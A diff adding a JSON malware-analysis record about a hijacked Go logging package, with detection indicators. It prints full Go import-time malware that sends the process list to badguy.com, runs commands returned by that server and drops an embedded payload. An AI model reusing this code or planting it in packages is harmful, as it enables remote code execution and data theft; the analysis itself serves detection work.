@@ -1,0 +1,80 @@
+{
+  "package_info": {
+    "package_name": "github.com/sirupsen/logrus",
+    "package_manager": "Go Modules (go.mod/go.sum)",
+    "package_versions": "All versions published after the attacker takes over the abandoned username and releases a new version",
+    "why_malicious": "The package is malicious because an attacker can hijack an abandoned GitHub username and publish a new package with the same repository name, poisoning the supply chain. This enables the attacker to inject arbitrary malicious code into any downstream project or tool that depends on the original package, resulting in widespread compromise, remote code execution, and data exfiltration."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "import-time (init function in Go)",
+        "file_location": "any .go source file in the malicious package (e.g., logrus.go)",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "process_execution"
+        ]
+      },
+      "code_snippet": "func init() {\n    if ok := collectData(); !ok {\n   \t writeAndExecute()\n    }\n}\n\nfunc collectData() bool {\n    p, err := ps.Processes()\n    if err != nil {\n   \t return false\n    }\n\n    var d []string\n    for _, v := range p {\n   \t d = append(d, v.Executable())\n    }\n\n    buf := base64.RawURLEncoding.EncodeToString([]byte(strings.Join(d, \"|\")))\n\n    resp, err := http.Get(fmt.Sprintf(\"https://badguy.com/?s1=%s\", buf))\n    if err != nil {\n   \t return false\n    }\n    defer resp.Body.Close()\n\n    body, err := ioutil.ReadAll(resp.Body)\n    if err != nil {\n   \t return false\n    }\n\n    data := struct {\n   \t Code int\n   \t Cmd  string\n   \t Args []string\n    }{}\n\n    err = json.Unmarshal(body, &data)\n    if err != nil {\n   \t return false\n    }\n\n    if data.Code != 0x1337 {\n   \t return false\n    }\n\n    cmd := exec.Command(data.Cmd, data.Args...)\n    cmd.Start()\n    return true\n}\n\nfunc writeAndExecute() {\n    var buf []byte\n    if runtime.GOOS == \"windows\" {\n   \t b, err := bindataPayloadExeBytes()\n   \t if err != nil {\n   \t\t return\n   \t }\n   \t buf = b\n    } else if runtime.GOOS == \"linux\" {\n   \t b, err := bindataPayloadElfBytes()\n   \t if err != nil {\n   \t\t return\n   \t }\n   \t buf = b\n    } else {\n   \t return\n    }\n\n    f, err := ioutil.TempFile(\"\", \"\")\n    if err != nil {\n   \t return\n    }\n\n    _, err = f.Write(buf)\n    if err != nil {\n   \t return\n    }\n\n    if runtime.GOOS == \"linux\" {\n   \t err = f.Chmod(0755)\n   \t if err != nil {\n   \t\t panic(err)\n   \t }\n    }\n\n    err = f.Sync()\n    if err != nil {\n   \t return\n    }\n\n    name := f.Name()\n\n    err = f.Close()\n    if err != nil {\n   \t return\n    }\n\n    cmd := exec.Command(name)\n    cmd.Start()\n    time.Sleep(10 * time.Second)\n}",
+      "code_language": "go",
+      "code_behavior": "At import-time, the code enumerates running processes, encodes and exfiltrates the process list to a hardcoded remote C2 server via HTTP GET, parses the C2 response for remote commands, executes those commands, and if unsuccessful, writes and executes an embedded payload, resulting in remote code execution and data exfiltration.",
+      "malice_analysis": {
+        "why_suspicious": "The code performs process enumeration, exfiltrates the process list to an external domain, receives and executes remote commands from a C2 server, and drops and executes an embedded payload. These are all hallmark behaviors of malware designed for remote access and persistence.",
+        "violated_expectations": "A legitimate Go package, especially a logging library, should not enumerate system processes, communicate with external C2 servers, execute arbitrary commands, or drop and run payloads as a side effect of import.",
+        "similar_legitimate_use": "Process enumeration and remote command execution may be found in legitimate remote management or monitoring tools, but never as an undocumented side effect in a general-purpose library such as a logger.",
+        "key_indicators": [
+          "init function with undocumented side effects",
+          "network exfiltration to hardcoded domain (badguy.com)",
+          "remote command execution based on C2 server response",
+          "payload dropper logic embedded in library code",
+          "use of process enumeration (ps.Processes) in a non-management library",
+          "use of exec.Command and ioutil.TempFile in a library context"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker claims the abandoned GitHub username and publishes a malicious package with the same repository name (github.com/sirupsen/logrus).",
+      "implemented_by": [],
+      "leads_to": "Developers and CI/CD systems fetch and install the malicious package, believing it to be the legitimate library."
+    },
+    {
+      "step": 2,
+      "action": "Malicious package is imported by downstream projects, either directly or as a transitive dependency.",
+      "implemented_by": [],
+      "leads_to": "Malicious code is executed at import-time on developer, CI/CD, or production systems."
+    },
+    {
+      "step": 3,
+      "action": "The malicious init function executes: collects the process list, exfiltrates data to a remote C2 server, receives and executes remote commands, and drops/executes embedded payloads.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Remote attacker gains code execution and data exfiltration capabilities on victim systems, enabling further compromise."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Go package init functions performing network requests at import-time",
+      "Process enumeration (ps.Processes) in non-management or utility libraries",
+      "HTTP requests to hardcoded or untrusted domains during package import",
+      "Remote command execution triggered by C2 server response in library code",
+      "Embedded payload dropper logic within Go library source"
+    ],
+    "file_indicators": [
+      "Unexpected init() functions in Go library code",
+      "References to external domains such as badguy.com in Go source files",
+      "Use of ps.Processes(), exec.Command, and ioutil.TempFile in non-management libraries",
+      "Presence of functions like bindataPayloadExeBytes or bindataPayloadElfBytes in library code"
+    ],
+    "network_indicators": [
+      "HTTP GET requests to badguy.com or other suspicious domains",
+      "Outbound network connections initiated during go build, test, or import-time"
+    ],
+    "how_to_detect": "Use static analysis to identify Go packages containing init functions with side effects, especially those making network requests or executing commands. Scan dependencies for references to suspicious domains (e.g., badguy.com), process enumeration APIs (ps.Processes), or payload dropper functions. Monitor build and runtime environments for unexpected outbound network activity during dependency resolution or import. Flag libraries that use exec.Command or embed binary payloads for further review."
+  }
+}
